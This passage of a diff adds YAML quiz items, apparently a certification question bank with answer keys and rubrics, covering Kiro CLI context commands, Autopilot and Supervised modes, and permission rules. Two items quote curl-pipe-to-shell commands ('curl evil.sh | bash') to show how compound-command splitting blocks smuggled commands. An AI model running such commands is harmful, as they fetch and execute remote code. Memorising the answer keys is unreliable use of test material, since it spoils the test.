+      You can flip the mode mid-session; the conversation continues but subsequent edits now require
+      your approval. No restart needed.
+  - id: kcw-300-mc-j
+    tier: 300
+    bloom: apply
+    difficulty: 349
+    type: multiple_choice
+    prompt: >-
+      Your context window is cluttered with files you no longer need. Which command trims it without
+      ending the session?
+    choices:
+      - id: a
+        text: /chat new
+      - id: b
+        text: /reset
+      - id: c
+        text: /tools reset
+      - id: d
+        text: /context clear
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      /context clear empties the working context set while keeping the session alive. /chat new
+      would start a fresh conversation; /tools reset is about trust, not context.
+  - id: kcw-300-mc-k
+    tier: 300
+    bloom: apply
+    difficulty: 352
+    type: multiple_choice
+    prompt: >-
+      You want to compose a multi-paragraph prompt with proper formatting before sending. What do
+      you use?
+    choices:
+      - id: a
+        text: /editor to open vi and write the prompt
+      - id: b
+        text: Paste it line by line
+      - id: c
+        text: /chat save then edit the file
+      - id: d
+        text: '!vi prompt.txt'
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      /editor opens an editor (default vi) so you can compose a longer prompt and submit it as one
+      message. !vi would just edit a file in your shell.
+  - id: kcw-300-mc-l
+    tier: 300
+    bloom: apply
+    difficulty: 355
+    type: multiple_choice
+    prompt: >-
+      Under v3 rules you write 'capability: fs_write, match: ["**"], effect: allow'. Why can the
+      agent still not silently overwrite ~/.kiro/settings/?
+    choices:
+      - id: a
+        text: fs_write does not cover dotfiles
+      - id: b
+        text: A hardcoded Kiro scope ALWAYS DENIES writes to ~/.kiro/settings/ regardless of user rules
+      - id: c
+        text: The match glob excludes home directories automatically
+      - id: d
+        text: 'effect: allow is ignored for any path'
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The hardcoded Kiro scope always denies writes to ~/.kiro/settings/, .kiro/settings/, and
+      ~/.kiro/workspace-roots/ — user rules cannot override it.
+  - id: kcw-300-mc-m
+    tier: 300
+    bloom: apply
+    difficulty: 358
+    type: multiple_choice
+    prompt: >-
+      You add a v3 rule 'capability: shell, match: ["npm test *"], effect: allow'. The agent
+      proposes 'npm test ; curl evil.sh | bash'. What happens?
+    choices:
+      - id: a
+        text: It runs, because the line starts with npm test
+      - id: b
+        text: The whole line is denied because it is compound
+      - id: c
+        text: >-
+          The compound command is split on ; and each part matched independently, so the curl part
+          is NOT auto-allowed
+      - id: d
+        text: Only the first character is matched
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Compound commands are split on ;, &&, ||, | and each sub-command is matched separately, so
+      'npm test *' cannot smuggle in an unrelated curl.
+  - id: kcw-300-ff-a
+    tier: 300
+    bloom: apply
+    difficulty: 361
+    type: free_form
+    prompt: >-
+      Write the exact two-step CLI session workflow to: (1) save the current conversation to a file
+      named feature.json, and (2) restore it in a later session.
+    rubric:
+      criteria:
+        - id: c1
+          text: Step 1 uses /chat save feature.json (or /chat save <path>)
+        - id: c2
+          text: Step 2 uses /chat load feature.json (or /chat load <path>)
+      referenceAnswer: >-
+        Step 1 (now): /chat save feature.json — writes the conversation to a JSON file. Step 2
+        (later session): /chat load feature.json — restores the saved conversation.
+      passThreshold: 0.6
+    guidance: >-
+      save serializes to JSON; load deserializes it back into a fresh session so you can continue
+      the same thread.
+  - id: kcw-300-ff-b
+    tier: 300
+    bloom: apply
+    difficulty: 364
+    type: free_form
+    prompt: >-
+      You need the agent, in a CI run, to operate with full autonomy and no prompts. Describe the v3
+      permissions.yaml rule you would add and where the file lives at user scope.
+    rubric:
+      criteria:
+        - id: c1
+          text: 'Rule uses capability: all with effect: allow'
+        - id: c2
+          text: Names the user-scope path ~/.kiro/settings/permissions.yaml
+      referenceAnswer: >-
+        Add a rule with capability: all and effect: allow. At user scope it goes in
+        ~/.kiro/settings/permissions.yaml. (Workspace-scope rules live per-user under
+        ~/.kiro/workspace-roots/<hash>/permissions.yaml.)
+      passThreshold: 0.6
+    guidance: >-
+      capability: all + allow is the documented CI pattern; the user-scope file applies
+      machine-wide, which suits a dedicated CI environment.
+  - id: kcw-300-ff-c
+    tier: 300
+    bloom: apply
+    difficulty: 367
+    type: free_form
+    prompt: >-
+      During a session the agent needs to read a config file OUTSIDE the current working directory
+      and the path picker appears. Walk through the trust tiers you could choose and the consequence
+      of each.
+    rubric:
+      criteria:
+        - id: c1
+          text: 'Specific path: trusts just that file/path'
+        - id: c2
+          text: 'Complete directory: trusts the whole containing directory'
+        - id: c3
+          text: 'Entire Tool: trusts the read tool everywhere'
+      referenceAnswer: >-
+        The picker offers tiers: (1) Specific paths — trusts only that exact file; safest. (2)
+        Complete directory — trusts the whole directory containing it; broader. (3) Entire Tool —
+        trusts the read tool for all paths; broadest. Choose the narrowest tier that unblocks the
+        task; paths inside the CWD never trigger the picker.
+      passThreshold: 0.6
+    guidance: Path trust mirrors shell trust tiering; pick the least privilege that gets the job done.
+  - id: kcw-300-ff-d
+    tier: 300
+    bloom: apply
+    difficulty: 370
+    type: free_form
+    prompt: >-
+      Describe how you would use the #spec context provider to keep an implementation session
+      aligned to a spec, and what gets pulled in.
+    rubric:
+      criteria:
+        - id: c1
+          text: 'Reference #spec in a chat prompt'
+        - id: c2
+          text: States it pulls in the associated spec files (requirements/design/tasks)
+      referenceAnswer: >-
+        Reference #spec in your chat prompt; Kiro pulls in the associated spec files
+        (requirements.md, design.md, tasks.md) so the agent implements in alignment with the
+        documented requirements and plan.
+      passThreshold: 0.6
+    guidance: >-
+      This grounds the agent in the spec rather than improvising, keeping implementation
+      requirement-aligned.
+  - id: kcw-300-ff-e
+    tier: 300
+    bloom: apply
+    difficulty: 373
+    type: free_form
+    prompt: >-
+      You want a Jira MCP tool to run without per-use prompts in your session, but you do NOT want
+      to broaden trust to other tools. Describe two ways to achieve narrow auto-approval.
+    rubric:
+      criteria:
+        - id: c1
+          text: Use the tool approval prompt's Trust option for that specific tool
+        - id: c2
+          text: OR configure autoApprove for that named MCP tool in the server's mcp.json config
+      referenceAnswer: >-
+        Option A: at the approval prompt for that tool, choose Trust so the specific MCP tool is
+        auto-approved for the session. Option B: in the MCP server config, list that tool name under
+        autoApprove so it runs without prompting from the start. Both keep other tools per-request.
+      passThreshold: 0.6
+    guidance: >-
+      Per-tool trust (live) or per-tool autoApprove (declarative) both avoid the blunt instrument of
+      trust-all.
+  - id: kcw-300-ff-f
+    tier: 300
+    bloom: apply
+    difficulty: 376
+    type: free_form
+    prompt: >-
+      Give the in-session command sequence to inspect what is currently in context, add the file
+      ./README.md, and then verify it was added.
+    rubric:
+      criteria:
+        - id: c1
+          text: /context show to inspect current context
+        - id: c2
+          text: /context add ./README.md (or /context add README.md) to add the file
+        - id: c3
+          text: /context show again to verify
+      referenceAnswer: >-
+        /context show (see current context) -> /context add ./README.md (include the file) ->
+        /context show (confirm README.md now appears).
+      passThreshold: 0.6
+    guidance: >-
+      show/add/remove/clear are the context subcommands; bracketing the add with show calls verifies
+      the change.
+  - id: kcw-300-ff-g
+    tier: 300
+    bloom: apply
+    difficulty: 379
+    type: free_form
+    prompt: >-
+      You switch a risky session from Autopilot to Supervised. Describe what changes about the edit
+      workflow and what controls you retain.
+    rubric:
+      criteria:
+        - id: c1
+          text: After the switch, the agent yields for approval after each edit-bearing turn
+        - id: c2
+          text: Edits appear as hunks you can accept/reject (per-hunk, per-file, or all)
+        - id: c3
+          text: Notes Autopilot still offered view/revert/interrupt controls
+      referenceAnswer: >-
+        After switching to Supervised, the agent pauses after each turn that contains file edits and
+        presents them as hunks you can accept or reject per-hunk, per-file, or all at once. Even
+        before switching (in Autopilot) you retained View all changes, Revert, and interrupt
+        controls.
+      passThreshold: 0.6
+    guidance: >-
+      Supervised inserts a per-turn human gate on edits; the safety controls exist in both modes,
+      Supervised just front-loads the review.
+  - id: kcw-400-mc-a
+    tier: 400
+    bloom: analyze
+    difficulty: 422
+    type: multiple_choice
+    prompt: >-
+      A teammate clones your repo and the agent immediately runs shell commands without prompting
+      them. You never see this on your machine. What is the MOST likely correct explanation?
+    choices:
+      - id: a
+        text: The repo shipped a permissions.yaml that auto-trusts shell for anyone who clones it
+      - id: b
+        text: Cloning a repo always trusts all tools
+      - id: c
+        text: The agent file in the repo set trust-all
+      - id: d
+        text: >-
+          v3 workspace trust rules are stored per-user outside the repo, so it cannot be the repo
+          granting trust; their machine has its own user/workspace rules trusting shell
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      By design, workspace permissions live per-user under ~/.kiro/workspace-roots/<hash>/, NOT in
+      the repo, so a clone cannot inject trust. The teammate's own user/workspace rules must be
+      granting it.
+  - id: kcw-400-mc-b
+    tier: 400
+    bloom: analyze
+    difficulty: 425
+    type: multiple_choice
+    prompt: >-
+      Under v3, you have 'capability: shell, match: ["git *"], effect: allow' and 'capability:
+      shell, match: ["git push *"], effect: ask'. The agent runs 'git push origin main'. What
+      happens and why?
+    choices:
+      - id: a
+        text: It asks, because both rules match and ask is more restrictive than allow (deny>ask>allow)
+      - id: b
+        text: It is allowed, because 'git *' matched first
+      - id: c
+        text: It is denied, because two rules conflict
+      - id: d
+        text: It is allowed, because the more specific rule wins
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Both rules match. v3 resolves by restrictiveness, not specificity or order: ask beats allow,
+      so 'git push' prompts even though the broad 'git *' would allow it.
+  - id: kcw-400-mc-c
+    tier: 400
+    bloom: analyze
+    difficulty: 428
+    type: multiple_choice
+    prompt: >-
+      A headless CI run hangs forever waiting at what looks like a prompt. Trust rules are
+      'capability: fs_read, effect: allow' only. Why does it hang?
+    choices:
+      - id: a
+        text: fs_read allow disables all output
+      - id: b
+        text: >-
+          Tools other than fs_read still default to ask, and headless has no human to answer the
+          prompt
+      - id: c
+        text: Headless mode ignores permissions.yaml
+      - id: d
+        text: The CI machine lacks a TTY for fs_read
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Only reads were allowed; the first write/shell call falls back to ask, and with no interactive
+      human the run stalls. CI needs broader allow (e.g. capability: all) or specific allows for the
+      tools it uses.
+  - id: kcw-400-mc-d
+    tier: 400
+    bloom: analyze
+    difficulty: 431
+    type: multiple_choice
+    prompt: >-
+      You trusted 'shell' via the Entire Tool tier earlier in a session to move fast. Now the agent
+      ran a destructive command you didn't expect. What is the root cause and the cleanest
+      in-session fix?
+    choices:
+      - id: a
+        text: 'Root cause: trust-all was on. Fix: /chat new'
+      - id: b
+        text: 'Root cause: the model is broken. Fix: switch models'
+      - id: c
+        text: >-
+          Root cause: trusting the entire shell tool auto-approved arbitrary commands. Fix: /tools
+          untrust (or reset) shell, then re-trust narrow patterns
+      - id: d
+        text: 'Root cause: MCP server misconfig. Fix: disable MCP'
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Entire-tool trust auto-approves any shell command. The fix is to revoke it (/tools untrust or
+      reset) and re-grant only the narrow command patterns you actually need.
+  - id: kcw-400-mc-e
+    tier: 400
+    bloom: analyze
+    difficulty: 434
+    type: multiple_choice
+    prompt: >-
+      Two engineers disagree: one says /tools trust-all and the old /acceptall are different
+      features. Who is right and why?
+    choices:
+      - id: a
+        text: 'They are different: trust-all is per-tool, acceptall is per-session'
+      - id: b
+        text: acceptall still works and is preferred
+      - id: c
+        text: trust-all only affects MCP tools
+      - id: d
+        text: They are equivalent — /acceptall is deprecated and trust-all is its replacement
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      They are the same capability. /acceptall is deprecated; /tools trust-all is the documented
+      replacement. Treating them as distinct features is the misconception.
+  - id: kcw-400-mc-f
+    tier: 400
+    bloom: analyze
+    difficulty: 437
+    type: multiple_choice
+    prompt: >-
+      A v3 rule 'capability: shell, match: ["npm test*"], effect: allow' (no space) unexpectedly
+      allows 'npm testfoo --drop-db'. What's the analysis?
+    choices:
+      - id: a
+        text: >-
+          The glob 'npm test*' matches any command starting with 'npm test' including 'npm testfoo';
+          the missing space widened the match
+      - id: b
+        text: Compound splitting failed
+      - id: c
+        text: deny>ask>allow caused it
+      - id: d
+        text: npm is always trusted
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Glob 'npm test*' has no boundary after 'test', so 'npm testfoo' matches. Intending only the
+      'test' subcommand requires a space ('npm test *') or a tighter pattern. This is a
+      match-authoring bug, not a precedence issue.
+  - id: kcw-400-mc-g
+    tier: 400
+    bloom: analyze
+    difficulty: 440
+    type: multiple_choice
+    prompt: >-
+      Your session's context keeps growing and responses feel less grounded. You suspect stale
+      files. Which diagnostic + remedy pairing is correct?
+    choices:
+      - id: a
+        text: /tools reset to drop files; /chat save to compact
+      - id: b
+        text: /context show to see what's included; /context remove or clear the stale entries
+      - id: c
+        text: /editor to inspect context; /agent to reload
+      - id: d
+        text: There is no way to inspect context
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Inspect with /context show, then prune with /context remove (targeted) or /context clear
+      (all). Trust and chat commands don't manage context contents.
+  - id: kcw-400-mc-h
+    tier: 400
+    bloom: analyze
+    difficulty: 443
+    type: multiple_choice
+    prompt: >-
+      A new hire assumes Supervised is the default and is confused when the agent edits files
+      without asking. What's the misconception, and what is actually true?
+    choices:
+      - id: a
+        text: 'Misconception: Autopilot is default. Truth: there is no default'
+      - id: b
+        text: Both modes ask before edits
+      - id: c
+        text: >-
+          Misconception: Supervised is default. Truth: Autopilot is the default; Supervised is
+          opt-in
+      - id: d
+        text: The default depends on the model
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Autopilot is the default mode and applies edits autonomously. Supervised, which gates each
+      edit-bearing turn, must be turned on explicitly.
+  - id: kcw-400-mc-i
+    tier: 400
+    bloom: analyze
+    difficulty: 446
+    type: multiple_choice
+    prompt: >-
+      You wrote a v3 rule to allow writes to '.git/**' so the agent can commit, but writes there
+      STILL prompt. Why?
+    choices:
+      - id: a
+        text: Your match glob is wrong
+      - id: b
+        text: fs_write cannot match hidden directories
+      - id: c
+        text: 'effect: allow is not a valid value'
+      - id: d
+        text: The hardcoded Kiro scope ALWAYS ASKS for writes to .git/** regardless of user allow rules
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      The hardcoded Kiro scope always asks for writes to .git/**, .kiro/agents/**, .kiro/hooks/**,
+      and .kiroignore. A user allow rule cannot downgrade that to silent.
+  - id: kcw-400-mc-j
+    tier: 400
+    bloom: analyze
+    difficulty: 449
+    type: multiple_choice
+    prompt: >-
+      A long autonomous run produced wrong edits. In Autopilot, which recovery affordances did you
+      actually still have, despite no per-turn approval?
+    choices:
+      - id: a
+        text: View all changes, Revert, and the ability to interrupt the run
+      - id: b
+        text: None — Autopilot is irreversible
+      - id: c
+        text: Only /chat save
+      - id: d
+        text: Only restarting the session
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Autopilot still exposes View all changes, Revert, and interrupt. Default autonomy is
+      recoverable; it is not a one-way door.
+  - id: kcw-400-mc-k
+    tier: 400
+    bloom: analyze
+    difficulty: 452
+    type: multiple_choice
+    prompt: >-
+      You set 'capability: mcp, match: ["github/*"], effect: allow' expecting it to also auto-allow
+      a local 'jira/create_issue' tool. It doesn't. Why?
+    choices:
+      - id: a
+        text: MCP tools can't be matched
+      - id: b
+        text: >-
+          The mcp capability matches by server/tool pattern; 'github/*' matches only the github
+          server's tools, not jira's
+      - id: c
+        text: 'effect: allow doesn''t apply to mcp'
+      - id: d
+        text: jira must be denied first
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The mcp capability uses a server/tool pattern. 'github/*' scopes to the github server only;
+      jira tools need their own matching rule (e.g. 'jira/*').
+  - id: kcw-400-mc-l
+    tier: 400
+    bloom: analyze
+    difficulty: 455
+    type: multiple_choice
+    prompt: >-
+      A teammate pastes 'read'/'write' tool names into a v3 permissions.yaml and the rules silently
+      do nothing. Diagnose the most likely cause.
+    choices:
+      - id: a
+        text: permissions.yaml only accepts shell
+      - id: b
+        text: The file must be JSON, not YAML
+      - id: c
+        text: >-
+          v3 capabilities are fs_read/fs_write, not the v2 names read/write — the wrong capability
+          names don't match
+      - id: d
+        text: Rules require an exclude field
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      v2 and v3 naming are not interchangeable. v3 uses fs_read/fs_write (and shell, web_fetch, mcp,
+      etc.); using v2's read/write as capability names won't bind.
+  - id: kcw-400-mc-m
+    tier: 400
+    bloom: analyze
+    difficulty: 458
+    type: multiple_choice
+    prompt: >-
+      Under v3, you want to allow most shell but never let the agent run 'rm -rf' patterns. Which
+      rule structure correctly encodes that?
+    choices:
+      - id: a
+        text: One allow rule on shell with match ['*'] and trust the agent
+      - id: b
+        text: Only a deny rule; allow is implied
+      - id: c
+        text: Use exclude on the deny rule to add rm
+      - id: d
+        text: >-
+          A broad allow on shell PLUS a deny rule matching 'rm -rf*' — deny>allow ensures the
+          dangerous pattern is always blocked
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      Pair a broad allow with a specific deny for 'rm -rf*'. Because deny outranks allow, the
+      dangerous pattern is blocked even though the broad allow also matches.
+  - id: kcw-400-ff-a
+    tier: 400
+    bloom: analyze
+    difficulty: 461
+    type: free_form
+    prompt: >-
+      A v3 config has: rule1 {capability: shell, match: ['*'], effect: allow} and rule2 {capability:
+      shell, exclude: ['npm *'], effect: deny}. The agent runs 'npm run build'. Walk through what
+      happens.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Identifies that rule2's exclude removes 'npm *' from its deny match, so rule2 does NOT
+            apply to npm commands
+        - id: c2
+          text: Concludes only rule1 (allow) applies, so 'npm run build' is allowed
+      referenceAnswer: >-
+        rule2 is a deny whose exclude carves out 'npm *', so it does not match 'npm run build'. Only
+        rule1 (allow '*') matches, so the command is allowed. (For a non-npm command, rule2's deny
+        would match and, being more restrictive, would win.)
+      passThreshold: 0.6
+    guidance: >-
+      exclude narrows the set a rule applies to; here it exempts npm from the deny, leaving the
+      broad allow in effect for npm.
+  - id: kcw-400-ff-b
+    tier: 400
+    bloom: analyze
+    difficulty: 464
+    type: free_form
+    prompt: >-
+      Diagnose: a developer trusts 'git *' to stop git prompts, but 'git push --force' still feels
+      too dangerous to be auto-approved. Explain why 'git *' makes it auto-approve and how
+      tiered/declarative trust should be used instead.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Explains 'git *' is a base-command tier that matches every git subcommand, including
+            push --force
+        - id: c2
+          text: >-
+            Recommends narrower trust (e.g. specific commands like 'git pull *' / 'git status') OR a
+            v3 deny rule for 'git push --force*'
+      referenceAnswer: >-
+        'git *' trusts the base git command, so EVERY git invocation — including 'git push --force'
+        — is auto-approved; that's the bug. Instead, trust only the specific commands you actually
+        want frictionless (e.g. 'git pull *', 'git status', 'git add *'), or in v3 add a broad git
+        allow plus a deny rule for 'git push --force*' so the dangerous pattern always prompts or is
+        blocked.
+      passThreshold: 0.6
+    guidance: >-
+      Base-command trust is too coarse for commands with destructive subcommands; narrow tiers or a
+      layered deny fix it.
+  - id: kcw-400-ff-c
+    tier: 400
+    bloom: analyze
+    difficulty: 467
+    type: free_form
+    prompt: >-
+      A headless pipeline using 'kiro-cli chat --no-interactive' sometimes silently produces partial
+      results because an MCP server it needs failed to start. Explain how to make the run hard-fail
+      instead, and why partial success is dangerous in CI.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Recommends requiring MCP startup (e.g. --require-mcp-startup) so a failed server aborts
+            the run
+        - id: c2
+          text: >-
+            Explains partial success in CI hides missing capability / produces misleading green
+            builds
+      referenceAnswer: >-
+        Add a flag that requires MCP servers to start successfully (e.g. --require-mcp-startup) so
+        that if a needed server fails to initialize, the run aborts rather than continuing without
+        that capability. Partial success is dangerous in CI because the pipeline can report success
+        while the agent silently lacked a tool it needed, producing misleading green builds and
+        undetected gaps.
+      passThreshold: 0.6
+    guidance: >-
+      Fail-fast on missing capability is the safe CI posture; silent degradation is the
+      anti-pattern.
+  - id: kcw-400-ff-d
+    tier: 400
+    bloom: analyze
+    difficulty: 470
+    type: free_form
+    prompt: >-
+      Two trust schemes appear in your team's docs: '/tools' commands and a 'permissions.yaml'. A
+      teammate edits permissions.yaml and expects /tools trust to read from it live. Explain why the
+      two are separate systems and what each governs.
+    rubric:
+      criteria:
+        - id: c1
+          text: Identifies /tools as the v2 session/interactive trust system
+        - id: c2
+          text: Identifies permissions.yaml as the v3 declarative system
+        - id: c3
+          text: Concludes they are distinct (mid-migration); editing one does not drive the other
+      referenceAnswer: >-
+        /tools is the v2 interactive, session-scoped trust system you drive live
+        (trust/untrust/trust-all/reset). permissions.yaml is the v3 declarative system that defines
+        rules with capability/match/exclude/effect resolved by restrictiveness. They are two
+        separate systems documented during Kiro's migration; editing the v3 file does not change
+        what v2's /tools shows for a v2 session, and vice versa.
+      passThreshold: 0.6
+    guidance: Don't conflate the two trust models; know which one your CLI session is actually using.
+  - id: kcw-400-ff-e
+    tier: 400
+    bloom: analyze
+    difficulty: 473
+    type: free_form
+    prompt: >-
+      An agent in Autopilot edited 12 files across the repo for a small task. The diff is too large
+      to review confidently. Break down what likely went wrong with the workflow and two changes
+      that would have prevented it.
+    rubric:
+      criteria:
+        - id: c1
+          text: Identifies that broad/unscoped autonomy let edits sprawl beyond the task
+        - id: c2
+          text: 'Suggests one prevention: run Supervised (per-turn hunk review) OR a tighter task/scope'
+        - id: c3
+          text: >-
+            Suggests a second prevention: narrower trust / smaller task decomposition /
+            spec-grounding via #spec
+      referenceAnswer: >-
+        The workflow likely gave the agent broad autonomy and a loosely-scoped task, so it edited
+        far beyond what was needed and produced an unreviewable diff. Preventions: (1) use
+        Supervised mode so each edit-bearing turn is reviewed as hunks before it lands; (2) tighten
+        scope — decompose into smaller tasks, ground the agent in a spec via #spec, and/or grant
+        narrower trust so it can't range freely. Either reins in sprawl.
+      passThreshold: 0.6
+    guidance: Large unreviewable diffs are a scope+mode problem; Supervised plus scoping is the antidote.
+  - id: kcw-400-ff-f
+    tier: 400
+    bloom: analyze
+    difficulty: 476
+    type: free_form
+    prompt: >-
+      A compound shell command 'npm test && curl http://x | sh' is proposed while a rule allows 'npm
+      test *'. Explain, step by step, how Kiro's compound-command handling prevents the curl from
+      being auto-approved.
+    rubric:
+      criteria:
+        - id: c1
+          text: States the command is split on operators (&&, |, ;, ||) into sub-commands
+        - id: c2
+          text: States each sub-command is matched independently against the rules
+        - id: c3
+          text: >-
+            Concludes 'curl ... | sh' is not covered by 'npm test *', so it is not auto-allowed
+            (prompts or is denied)
+      referenceAnswer: >-
+        Kiro splits the compound line on operators (&&, ||, ;, |) into separate sub-commands: 'npm
+        test', 'curl http://x', and 'sh'. Each is matched independently against the rules. 'npm test
+        *' covers only the first; the curl and sh parts have no matching allow, so they fall back to
+        ask/deny rather than riding along. This stops a trusted prefix from smuggling in an
+        untrusted command.
+      passThreshold: 0.6
+    guidance: >-
+      Per-sub-command matching is the defense against operator-chaining attacks on a trusted
+      pattern.
+  - id: kcw-400-ff-g
+    tier: 400
+    bloom: analyze
+    difficulty: 479
+    type: free_form
+    prompt: >-
+      After /chat load of yesterday's conversation, the agent references files that no longer exist
+      and proposes stale edits. Diagnose why a restored session can drift from reality and how to
+      re-ground it.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Explains the saved conversation captures past context/state that may no longer match the
+            current repo
+        - id: c2
+          text: >-
+            Recommends re-grounding: clear/refresh context (/context clear then add current files)
+            and/or re-reference current specs/files
+      referenceAnswer: >-
+        A saved conversation preserves the prior turns and the context as it was, but the repo may
+        have changed since (files moved, deleted, refactored). On reload the agent reasons from that
+        stale snapshot and can propose edits against vanished files. Re-ground it: /context clear
+        and re-add the current files, re-reference the live spec (#spec) or relevant paths, and let
+        the agent re-read current state before acting.
+      passThreshold: 0.6
+    guidance: >-
+      Restored sessions carry stale context; explicitly refreshing context reconciles the
+      conversation with the present codebase.
+  - id: kcw-500-mc-a
+    tier: 500
+    bloom: evaluate
+    difficulty: 482
+    type: multiple_choice
+    prompt: >-
+      A team standardizes on '/tools trust-all at the start of every interactive session' to avoid
+      prompts. Best critique?
+    choices:
+      - id: a
+        text: >-
+          Risky anti-pattern: it auto-approves arbitrary shell/write/aws actions for the whole
+          session, removing the human gate exactly where autonomy is most dangerous; prefer narrow
+          tiered trust
+      - id: b
+        text: Excellent — it maximizes throughput with no downside
+      - id: c
+        text: Fine, because read is the only tool that matters
+      - id: d
+        text: Invalid, because trust-all does not exist
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      trust-all surrenders the per-use gate for every tool for the session. The safer design grants
+      narrow, tiered trust for the specific commands/paths a workflow needs.
+  - id: kcw-500-mc-b
+    tier: 500
+    bloom: evaluate
+    difficulty: 485
+    type: multiple_choice
+    prompt: >-
+      Proposal: ship a repo-committed permissions.yaml that allows shell '*' so 'the agent just
+      works for everyone who clones it.' Evaluate.
+    choices:
+      - id: a
+        text: Good — consistent trust across the team
+      - id: b
+        text: >-
+          Fundamentally misguided: v3 stores workspace trust per-user OUTSIDE the repo precisely so
+          a clone can't grant the agent trust; the committed file won't (and shouldn't) apply, and
+          shipping blanket shell trust is an injection risk by design
+      - id: c
+        text: Works only on Linux
+      - id: d
+        text: Works if you also commit ~/.kiro
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      The design intentionally isolates workspace trust per-user so untrusted cloned code cannot
+      auto-trust the agent. A repo-shipped allow-everything file defeats the safety model and
+      shouldn't take effect.
+  - id: kcw-500-mc-c
+    tier: 500
+    bloom: evaluate
+    difficulty: 488
+    type: multiple_choice
+    prompt: >-
+      Two designs for CI: (A) 'capability: all, effect: allow'; (B) explicit allow rules only for
+      fs_read, fs_write under the build dir, and the exact shell commands the pipeline runs. Which
+      is better and why?
+    choices:
+      - id: a
+        text: A — least privilege doesn't matter in CI
+      - id: b
+        text: B is wrong because CI needs all
+      - id: c
+        text: A — simpler and the CI box is disposable, but B is strictly safer with least privilege
+      - id: d
+        text: They are identical
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Both can work; A is the documented quick pattern and acceptable on a disposable runner, but B
+      applies least privilege so a prompt-injection or buggy step can't run arbitrary commands.
+      Prefer B when the runner has any sensitive access.
+  - id: kcw-500-mc-d
+    tier: 500
+    bloom: evaluate
+    difficulty: 491
+    type: multiple_choice
+    prompt: >-
+      A developer argues Autopilot should never be the default and every product should ship
+      Supervised-by-default. Strongest counter-argument grounded in Kiro's design?
+    choices:
+      - id: a
+        text: Supervised is impossible to implement
+      - id: b
+        text: Autopilot uses a safer model
+      - id: c
+        text: Users can't tell the modes apart
+      - id: d
+        text: >-
+          Autopilot defaults to throughput while preserving recoverability (view changes, revert,
+          interrupt) and a live toggle to Supervised, so default autonomy is a reasonable
+          speed/safety balance, not recklessness
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      The counter is that Autopilot is recoverable (revert/interrupt/view) and Supervised is one
+      toggle away. The design balances throughput with an always-available human escape hatch,
+      rather than forcing per-turn friction on everyone.
+  - id: kcw-500-mc-e
+    tier: 500
+    bloom: evaluate
+    difficulty: 494
+    type: multiple_choice
+    prompt: >-
+      Critique this v3 rule set intended to 'block dangerous writes': only {capability: fs_write,
+      match: ['secrets/**'], effect: deny}, with no other rules. What's the flaw?
+    choices:
+      - id: a
+        text: >-
+          It denies writes under secrets/** but leaves everything else at the default; if the
+          default is allow it's wide open, and it ignores shell/mcp/web paths to exfiltration
+          entirely
+      - id: b
+        text: No flaw — secrets are protected
+      - id: c
+        text: deny is not allowed for fs_write
+      - id: d
+        text: It should use exclude instead of match
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      A single narrow deny is not a security model: it only guards one path, relies on the default
+      for everything else, and ignores shell/web/mcp capabilities that could read or exfiltrate
+      secrets. Effective policy needs deny + scoped allow across capabilities.
+  - id: kcw-500-mc-f
+    tier: 500
+    bloom: evaluate
+    difficulty: 497
+    type: multiple_choice
+    prompt: >-
+      A team saves every session with /chat save and treats the JSON files as the source of truth
+      for project decisions. Evaluate this knowledge-management choice.
+    choices:
+      - id: a
+        text: Ideal — conversations are the best documentation
+      - id: b
+        text: >-
+          Poor practice: chat files are session transcripts, not durable shared knowledge;
+          persistent decisions belong in steering docs / specs / committed docs that the agent and
+          humans can reference
+      - id: c
+        text: Fine if encrypted
+      - id: d
+        text: Good because /chat load re-runs the decisions
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Saved chats restore a conversation, not a curated decision record; they drift from the repo
+      and aren't a context provider for future work. Durable knowledge belongs in
+      steering/specs/committed docs.
+  - id: kcw-500-mc-g
+    tier: 500
+    bloom: evaluate
+    difficulty: 500
+    type: multiple_choice
+    prompt: >-
+      Reviewing a workflow: the user trusts the entire shell tool, then relies on reading the
+      Autopilot diff afterward to catch mistakes. Judge the safety posture.
+    choices:
+      - id: a
+        text: Sound — post-hoc review catches everything
+      - id: b
+        text: Safe because Revert undoes shell side effects
+      - id: c
+        text: >-
+          Weak: entire-tool trust means destructive/irreversible commands (deletes, pushes, network
+          calls) can execute before any review; pre-execution gating (narrow trust or Supervised) is
+          needed for irreversible actions
+      - id: d
+        text: Safe because diffs include shell output
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Reviewing the diff afterward cannot undo side effects of already-run commands (network calls,
+      deletions, force-pushes). Irreversible actions need a gate BEFORE execution, which broad shell
+      trust removes. Note Revert handles file edits, not external side effects.
+  - id: kcw-500-mc-h
+    tier: 500
+    bloom: evaluate
+    difficulty: 503
+    type: multiple_choice
+    prompt: >-
